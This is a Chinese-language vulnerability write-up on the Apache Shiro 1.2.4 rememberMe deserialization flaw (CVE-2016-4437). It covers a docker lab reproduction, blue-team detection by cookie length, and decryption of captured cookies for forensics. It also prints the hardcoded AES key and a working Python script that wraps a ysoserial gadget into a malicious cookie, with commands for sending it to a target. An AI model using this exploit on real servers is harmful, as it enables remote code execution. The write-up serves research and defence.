# Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)

## 简介

Apache Shiro 是重要的 Java 权限及安全验证框架。

根据[官方issue](https://issues.apache.org/jira/browse/SHIRO-550)

* Retrieve the value of the rememberMe cookie

* CookieRememberMeManager.java

* Base64 decode

* Decrypt using AES

* 加密密钥硬编码

* Java serialization(ObjectInputStream)

CookieRememberMemanager.java 的父类AbstractRememberMeManager存在硬编码：


	/**
     * The following Base64 string was generated by auto-generating an AES Key:
     * <pre>
     * AesCipherService aes = new AesCipherService();
     * byte[] key = aes.generateNewKey().getEncoded();
     * String base64 = Base64.encodeToString(key);
     * </pre>
     * The value of 'base64' was copied-n-pasted here:
     */
    private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

因为 AES 是对称加密，即加密密钥也同样是解密密钥。

攻击者可以使用有效的rememberMe cookie，然后构造rememberMe来执行Java反序列化攻击，最终导致远程代码执行。

## 复现


使用这个docker复现成功，使用vulhub镜像复现未成功。

```docker pull medicean/vulapps:s_shiro_1```

```docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1```



![](2.png)

apache shiro 这个洞, 登录时需要勾选 ```Remember me``` ， 否则Cookie显示的是 ```rememberMe=deteleMe```

![](1.png)

登陆后看到 Cookie中的rememberMe记录登陆后的加密字符串。

![](3.jpg)

**实际复现无需登陆。**

生成payload的脚本：

	import sys
	import base64
	import uuid
	from random import Random
	import subprocess
	from Crypto.Cipher import AES  # pip3 install pycryptodome
	
	def encode_rememberme(command):
	    popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-30099844c6-1.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
	    BS   = AES.block_size
	    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
	    mode =  AES.MODE_CBC
	    iv   =  uuid.uuid4().bytes
	    encryptor = AES.new(base64.b64decode(key), mode, iv)
	    file_body = pad(popen.stdout.read())
	    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
	    return base64_ciphertext
	
	if __name__ == '__main__':
	    payload = encode_rememberme(sys.argv[1])
		with open("payload.cookie", "w") as f:
			print("rememberMe={}".format(payload.decode()), file=f) 

用法： 

	python3 shiro_payload.py "touch /tmp/success"

	http get(或head) ip:8080 Cookie:`cat payload.cookie`

## 特征分析

正常登陆成功返回的cookie 中 rememberMe= 后的加密key长度 500多。 恶意key通常较长，有4000多，可以设置阈值长度，再根据告警的资产用脚本打 dns log平台验证。

## 影响版本

Apache Shiro <= 1.2.4

## shiro rememberMe cookie 解密研究

为何要解密加密的rememberMe：在实际的应用中，部署shiro的服务器很可能把shiro关键字 rememberMe 改了，有红队的同学就在现网看见过关键字被改成```rmbMe```，如果改成其他的生僻或常见关键字，蓝队不好取证，不好证明它是shiro攻击。

作为蓝队，拿到攻击payload，不能保证允许在客户服务器进行攻击复现，如果能通过AES解密，还原出序列化的命令，客户是一定认可这个攻击的，便于蓝队取证。

参考代码审计： https://blog.csdn.net/three_feng/article/details/52189559

![](4.png)

如下图，研究shiro加密逻辑发现，AES的iv的length是16的倍数，iv被和已序列化的字节流拼接，base64加密传输给后端，所以rememberMe的base64解码后的前16个字节 就是AES的初始化向量iv。

![](5.png)

根据这个逻辑可以编写解码脚本。 前16位为iv,后面的为序列化的字节流。

![](6.png)

通过在网上采集的 shiro_96key，遍历key，解密，采集语句例如： ```https://github.com/search?p=1&q=setCipherKey%28Base64.decode%28%22&type=Code```

![](8.png)

程序运行效果如下：

![](7.png)

## 参考资料


[创宇404实验室分析Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞](https://paper.seebug.org/shiro-rememberme-1-2-4/)


[What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)


[这里收集其他硬编码的秘钥，以及测试其他不同的可以使用的CommonCollections版本](https://cloud.tencent.com/developer/article/1540882)

[Java反序列化入门-Shiro RememberMe 1.2.4远程代码执行漏洞-详细分析](https://xz.aliyun.com/t/6493)

![](9.png)